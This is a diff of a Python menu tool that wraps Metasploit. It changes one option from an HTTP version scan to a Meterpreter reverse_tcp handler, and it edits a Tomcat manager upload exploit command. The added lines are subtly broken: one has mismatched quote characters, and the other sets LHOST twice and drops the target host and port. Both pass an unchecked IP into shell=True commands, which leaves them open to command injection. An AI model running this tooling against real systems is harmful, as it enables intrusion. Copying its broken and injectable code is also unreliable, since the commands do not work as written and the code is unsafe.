@@ -459,7 +459,7 @@ def metasploit_scan():
            print("99. Return to main menu")
            choice = input(Fore.BLUE + "\nEnter your choice: ").strip()
            if choice == '1':
-              command = f"msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOST {ip} set RPORT 4444 run'"
+              command = f"msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {ip}; set lport 4444; exploit -j'"
               print(Fore.BLUE + f"Running {command}...")
               process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
               stdout, stderr = process.communicate()
@@ -470,7 +470,7 @@ def metasploit_scan():
                 print(Fore.BLUE + "Metasploit Completed Successfully.")
                 print(output)
            elif choice == '2':
-              command = f"msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOST {ip} RPORT 4444 exploit'"
+              command = f"msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set LHOST {ip} LHOST 4444 exploit'"
               print(Fore.BLUE + f"Running {command}...")
               process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
               stdout, stderr = process.communicate()
